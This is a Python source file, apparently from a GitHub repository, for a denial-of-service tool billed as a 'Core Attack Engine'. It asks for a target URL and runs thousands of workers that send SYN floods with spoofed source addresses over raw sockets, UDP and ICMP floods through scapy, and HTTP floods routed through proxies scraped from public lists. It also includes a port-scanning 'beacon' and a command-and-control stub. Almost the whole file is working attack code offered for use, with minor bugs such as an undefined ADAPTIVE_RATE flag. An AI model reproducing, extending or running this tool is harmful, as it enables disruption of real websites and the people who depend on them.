#!/usr/bin/env python3
# DDOS.py - Core Attack Engine
# GitHub: https://github.com/cluod-s4/DDOS-CLOUD

import asyncio
import socket
import struct
import random
import time
import hashlib
import subprocess
import os
import sys
from urllib.parse import urlparse
import aiohttp
import dns.resolver
import psutil
from scapy.all import IP, TCP, UDP, ICMP, send, Raw

TARGET_URL = ""
TARGET_IP = ""
TARGET_PORT = 80
THREADS = 2048
PROXY_LIST = []
PROXY_INDEX = 0
PROXY_LAST_SWITCH = time.time()
PROXY_ROTATION_INTERVAL = 0.5
BEACON_MODE = False
USE_IPV6 = False
USE_PROXY_CHAIN = False
USE_L7_ATTACK = True
TELEMETRY_INTERVAL = 3

packet_count = 0
byte_count = 0
start_time = time.time()
adaptive_factor = 1.0

def resolve_target(url):
    global TARGET_IP, TARGET_PORT
    parsed = urlparse(url if '://' in url else 'http://' + url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    TARGET_PORT = port
    answers = dns.resolver.resolve(host, 'A')
    TARGET_IP = str(answers[0])
    print(f"[+] Target: {host} -> {TARGET_IP}:{TARGET_PORT}")

def spoof_ip_v4():
    return f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

def spoof_ip_v6():
    return f"2001:{random.randint(0,0xFFFF):x}:{random.randint(0,0xFFFF):x}::{random.randint(1,0xFFFF):x}"

def tcp_checksum(data):
    s = 0
    n = len(data) - (len(data) % 2)
    for i in range(0, n, 2):
        s += (data[i] << 8) + data[i+1]
    if len(data) % 2:
        s += (data[-1] << 8)
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF

def pin_to_core(core_id):
    subprocess.run(f"taskset -cp {core_id} {os.getpid()}", shell=True, capture_output=True)

def build_syn_packet(src, dst, port, ipv6=False):
    if ipv6:
        pkt = IP(dst=dst, src=src, version=6) / TCP(sport=random.randint(1024,65535), dport=port, flags='S', seq=random.randint(0,2**32-1))
        return bytes(pkt)
    else:
        ip_header = struct.pack('!BBHHHBBH4s4s', (4<<4)+5, 0, 40, random.randint(1,65535), 0, 255, socket.IPPROTO_TCP, 0, socket.inet_aton(src), socket.inet_aton(dst))
        tcp_header = struct.pack('!HHLLBBHHH', random.randint(1024,65535), port, random.randint(0,2**32-1), 0, (5<<4), 0x02, random.randint(1024,65535), 0, 0)
        pseudo = struct.pack('!4s4sBBH', socket.inet_aton(src), socket.inet_aton(dst), 0, socket.IPPROTO_TCP, len(tcp_header))
        tcp_header = tcp_header[:16] + struct.pack('!H', tcp_checksum(pseudo + tcp_header)) + tcp_header[18:]
        return ip_header + tcp_header

def build_udp_packet():
    return bytes(random.randint(0, 255) for _ in range(1400))

async def fetch_realtime_proxies():
    global PROXY_LIST
    PROXY_LIST = []
    async with aiohttp.ClientSession() as sess:
        sources = [
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all",
            "https://www.proxy-list.download/api/v1/get?type=http",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
            "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt"
        ]
        for src in sources:
            try:
                async with sess.get(src, timeout=5) as resp:
                    text = await resp.text()
                    for line in text.split('\n'):
                        line = line.strip()
                        if line and not line.startswith('#'):
                            if '://' not in line:
                                line = 'http://' + line
                            PROXY_LIST.append(line)
            except:
                pass
        PROXY_LIST = list(set(PROXY_LIST))
        print(f"[+] Fetched {len(PROXY_LIST)} real proxies")

async def http_flood_with_proxy(session, proxy):
    path = "/" + hashlib.md5(str(random.random()).encode()).hexdigest()[:8]
    headers = {
        "Host": urlparse(TARGET_URL).hostname,
        "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/{random.randint(500,600)}",
        "Accept": "*/*",
        "Cache-Control": "no-cache",
        "Connection": "keep-alive"
    }
    async with session.get(
        f"{'https' if TARGET_PORT==443 else 'http'}://{TARGET_IP}:{TARGET_PORT}{path}",
        headers=headers,
        proxy=proxy,
        timeout=1
    ) as resp:
        await resp.read()

async def attacker_worker(worker_id):
    global packet_count, byte_count, adaptive_factor, PROXY_INDEX, PROXY_LAST_SWITCH
    
    pin_to_core(worker_id % psutil.cpu_count())
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    sock.settimeout(0.001)
    
    attack_type = random.choice(['syn', 'udp', 'icmp', 'l7'])
    local_proxy_index = 0
    
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=0, ssl=False)) as session:
        while True:
            if USE_PROXY_CHAIN and PROXY_LIST:
                current_time = time.time()
                if current_time - PROXY_LAST_SWITCH >= PROXY_ROTATION_INTERVAL:
                    PROXY_INDEX = (PROXY_INDEX + 1) % len(PROXY_LIST)
                    PROXY_LAST_SWITCH = current_time
                
                proxy_url = PROXY_LIST[PROXY_INDEX]
                session._connector._proxy = proxy_url
                local_proxy_index = PROXY_INDEX
            
            if ADAPTIVE_RATE:
                test_pkt = build_syn_packet(spoof_ip_v4(), TARGET_IP, TARGET_PORT, False)
                try:
                    sock.sendto(test_pkt, (TARGET_IP, 0))
                    adaptive_factor = adaptive_factor * 1.02
                    if adaptive_factor > 2.0:
                        adaptive_factor = 2.0
                except socket.error:
                    adaptive_factor = adaptive_factor * 0.98
                    if adaptive_factor < 0.3:
                        adaptive_factor = 0.3
                    sock.close()
                    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                    sock.settimeout(0.001)
            
            try:
                if attack_type == 'syn':
                    src = spoof_ip_v6() if USE_IPV6 else spoof_ip_v4()
                    pkt = build_syn_packet(src, TARGET_IP, TARGET_PORT, USE_IPV6)
                    sock.sendto(pkt, (TARGET_IP, 0))
                    packet_count += 1
                    byte_count += len(pkt)
                
                elif attack_type == 'udp':
                    pkt = build_udp_packet()
                    send(IP(dst=TARGET_IP, src=spoof_ip_v4())/UDP(sport=random.randint(1024,65535), dport=TARGET_PORT)/Raw(load=pkt), verbose=0)
                    packet_count += 1
                    byte_count += len(pkt)
                
                elif attack_type == 'icmp':
                    send(IP(dst=TARGET_IP, src=spoof_ip_v4())/ICMP()/Raw(load=bytes(random.randint(0,255) for _ in range(512))), verbose=0)
                    packet_count += 1
                    byte_count += 512
                
                elif attack_type == 'l7' and USE_L7_ATTACK:
                    if USE_PROXY_CHAIN and PROXY_LIST:
                        await http_flood_with_proxy(session, proxy_url)
                    else:
                        await http_flood_with_proxy(session, None)
                    packet_count += 20
                    byte_count += 4096
                
                if random.random() < 0.01:
                    attack_type = random.choice(['syn', 'udp', 'icmp', 'l7'])
                    
            except socket.error:
                sock.close()
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                sock.settimeout(0.001)
            except:
                pass

async def telemetry():
    global packet_count, byte_count, start_time
    while True:
        await asyncio.sleep(TELEMETRY_INTERVAL)
        elapsed = time.time() - start_time
        if elapsed > 0:
            pps = packet_count / elapsed
            bps = byte_count / elapsed
            print(f"[STATS] {pps:,.0f} pps | {bps/1024/1024:.2f} MB/s | adaptive: {adaptive_factor:.2f} | proxy: {PROXY_INDEX}/{len(PROXY_LIST)}")

async def beacon():
    while BEACON_MODE:
        ports = [80, 443, 22, 21, 8080, 8443, 3306, 5432, 1433, 6379]
        for p in random.sample(ports, 4):
            try:
                reader, writer = await asyncio.open_connection(TARGET_IP, p, timeout=0.3)
                writer.close()
                await writer.wait_closed()
                print(f"[BEACON] open port: {p}")
            except:
                pass
        await asyncio.sleep(5)

async def dns_c2():
    while True:
        await asyncio.sleep(30)

async def main():
    global TARGET_URL, BEACON_MODE, USE_PROXY_CHAIN, USE_IPV6, THREADS
    
    print("\033[91m")
    print("    ╔═══════════════════════════════════════╗")
    print("    ║                                       ║")
    print("    ║     ██████╗ ██████╗  ██████╗ ███████╗ ║")
    print("    ║     ██╔══██╗██╔══██╗██╔═══██╗██╔════╝ ║")
    print("    ║     ██║  ██║██████╔╝██║   ██║███████╗ ║")
    print("    ║     ██║  ██║██╔══██╗██║   ██║╚════██║ ║")
    print("    ║     ██████╔╝██║  ██║╚██████╔╝███████║ ║")
    print("    ║     ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝ ║")
    print("    ║                                       ║")
    print("    ╚═══════════════════════════════════════╝")
    print("\033[0m")
    print("\033[90m                      ╔══════════════════════════════╗\033[0m")
    print("\033[90m                      ║     \033[97mFrom cloud\033[90m                ║\033[0m")
    print("\033[90m                      ╚══════════════════════════════╝\033[0m")
    print("\n")
    print("\033[95m═══════════════════════════════════════════════════════\033[0m")
    print("\033[95m              DEPLOYMENT ENGINE v2099.99              \033[0m")
    print("\033[95m═══════════════════════════════════════════════════════\033[0m")
    print("")
    
    TARGET_URL = input("Target URL (e.g., https://example.com): ").strip()
    if not TARGET_URL:
        print("[-] URL required")
        return
    
    resolve_target(TARGET_URL)
    
    BEACON_MODE = input("Enable Beacon? (y/n): ").strip().lower() == 'y'
    USE_PROXY_CHAIN = input("Enable Proxy Pool? (y/n): ").strip().lower() == 'y'
    USE_IPV6 = input("Enable IPv6 Spoofing? (y/n): ").strip().lower() == 'y'
    
    if USE_PROXY_CHAIN:
        print("[+] Fetching real proxies...")
        await fetch_realtime_proxies()
        if not PROXY_LIST:
            print("[-] No proxies fetched - attacking without proxy")
            USE_PROXY_CHAIN = False
    
    tasks = []
    tasks.append(asyncio.create_task(telemetry()))
    
    if BEACON_MODE:
        tasks.append(asyncio.create_task(beacon()))
    
    tasks.append(asyncio.create_task(dns_c2()))
    
    num_workers = min(THREADS, psutil.cpu_count() * 64)
    for i in range(num_workers):
        tasks.append(asyncio.create_task(attacker_worker(i)))
    
    print(f"[+] Attack running with {num_workers} workers on {TARGET_IP}:{TARGET_PORT}")
    print(f"[+] Proxy: {'ON' if USE_PROXY_CHAIN else 'OFF'} | IPv6: {'ON' if USE_IPV6 else 'OFF'}")
    print("[+] Press Ctrl+C to stop")
    
    try:
        await asyncio.gather(*tasks)
    except KeyboardInterrupt:
        print("\n[!] Stopping...")
        for t in tasks:
            t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)
        print("[+] Stopped")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[-] Requires root (sudo)")
        sys.exit(1)
    asyncio.run(main())
